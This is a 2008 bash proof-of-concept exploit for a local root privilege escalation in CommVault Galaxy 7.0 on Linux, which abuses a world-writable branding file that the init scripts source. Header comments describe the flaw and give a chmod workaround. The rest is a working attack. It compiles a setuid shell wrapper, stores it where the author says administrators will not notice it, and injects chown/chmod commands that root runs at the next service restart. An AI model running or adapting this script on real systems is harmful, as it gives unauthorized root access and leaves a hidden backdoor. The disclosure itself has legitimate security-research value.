#!/bin/bash
#
# commvaultbranding.sh by cenobyte 08/08/2008
#
# CommVault Galaxy Data Protection 7.0 local Linux root POC exploit
#
# On the default Linux installation of CommVault Galaxy there are
# lots of files with insecure permissions.
# /opt/galaxy/branding is such a file and is sourced by the
# /etc/rc.d/rc3.d/[S|K]99Galaxy scripts to set environment variables
# during CommVault startup and stop. Unfortunately the branding
# file is world writable and can be (ab)used by an attacker to insert
# malicious commands that get executed when CommVault is [re]started.
#
# This vulnerability was discovered in version 7.0.0 Build76 on RHEL4u5 x86_64
# It is unknown if (older) versions and/or other UNIX platforms are also
# vulnerable.
#
# Vulnerability workaround:
# chmod 755 /opt/galaxy/branding
#
# Risk:
# Moderate; an administrator needs to restart CommVault for the exploit to
# succesfully finish.
#
# Exploit dependencies:
# This POC exploit relies on gcc and the absence of /opt nosuid and noexec
# flags in /etc/fstab. I chose to use /opt/galaxy/PF as a temporary directory
# and location for the setuid root shell to hide it from system administrators
# that usually snoop around in /tmp.

branding="/opt/galaxy/branding"
pf="/opt/galaxy/PF"
gcc="/usr/bin/gcc"

if [ ! -f $branding ]; then
	echo "error: $branding does not exist"
	exit 1
fi

for x in $branding $pf; do 
	if [ ! -w $x ]; then
		echo "error: $x is not writable"
		exit 1
	fi
done

if [ ! -x $gcc ]; then
	echo "error: cannot execute $gcc"
	exit 1
fi

/bin/grep -q "$pf/shell" $branding
if [ $? -eq 0 ]; then
	echo "Be patient!"
	exit 1
fi

echo -e "[-] CommVault Galaxy Data Protection 7.0 local Linux root exploit\n"
echo "[*] creating shell wrapper"
/bin/cat > $pf/shell.c << _END_
#include <unistd.h>

int
main()
{
	setuid(0);
	setgid(0);

	execl("/bin/sh", "/bin/sh", NULL);

	/* never reached */
	return(0);
}
_END_

echo "[*] compiling shell wrapper"
$gcc $pf/shell.c -o $pf/shell 2> /dev/null
if [ $? -ne 0 ]; then
	echo "error: gcc failed"

	# cleaning up
	/bin/rm -f $pf/shell.c
	exit 1
fi

echo "[*] inserting shell wrapper setuid commands"
echo "/bin/chown root:root $pf/shell" > $pf/b.$$
echo "/bin/chmod +s $pf/shell" >> $pf/b.$$
/bin/cat $branding >> $pf/b.$$
/bin/cat $pf/b.$$ > $branding

# Cleaning up
/bin/rm -f $pf/b.$$ $pf/shell.c

echo -e "[*] done\n"
echo "Now wait for CommVault to be (re)started"

exit 0
